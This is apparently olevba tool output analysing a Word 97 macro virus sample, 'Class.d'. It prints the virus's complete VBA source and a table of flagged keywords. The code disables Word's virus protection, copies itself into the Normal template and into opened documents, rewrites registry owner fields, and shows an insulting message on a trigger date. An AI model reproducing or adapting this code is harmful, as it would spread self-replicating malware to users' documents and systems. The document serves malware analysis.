olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-0c1c49e088b857ad41fd31dcb0e5580d526d4128
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-0c1c49e088b857ad41fd31dcb0e5580d526d4128 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
Const REG_SZ As Long = 1
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
Const HKEY_CURRENT_USER As Long = &H80000001
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
Sub AutoOpen()
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
On Error GoTo out
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
Options.VirusProtection = False
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
Options.SaveNormalPrompt = False
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
Options.ConfirmConversions = False
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
If nt > 70 And ad > 0 Then GoTo out
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
If nt < 70 Then
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
End If
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
host.codemodule.AddFromFile ("c:\class.sys")
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
With host.codemodule
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
    For x = 1 To 16
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
    .deletelines 1
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
    Next x
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
End With
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
If nt < 70 Then
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
    With host.codemodule
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
    .replaceline 1, "Sub AutoClose()"
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
    .replaceline 91, "Sub ToolsMacro()"
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
    For x = 70 To 81
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
        .deletelines 62
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
    Next x
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
    .replaceline 35, "    For x = 1 To 4"
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
    End With
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
End If
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
If nt < 70 Then
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
u = RegCloseKey(k)
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
End If
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
With host.codemodule
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
    For x = 2 To 104 Step 2
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
    Next x
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
End With
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
out:
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
End Sub
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
Sub ViewVBCode()
'Microsoft Word 97 Microsoft Word 97 Microsoft Word 97
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

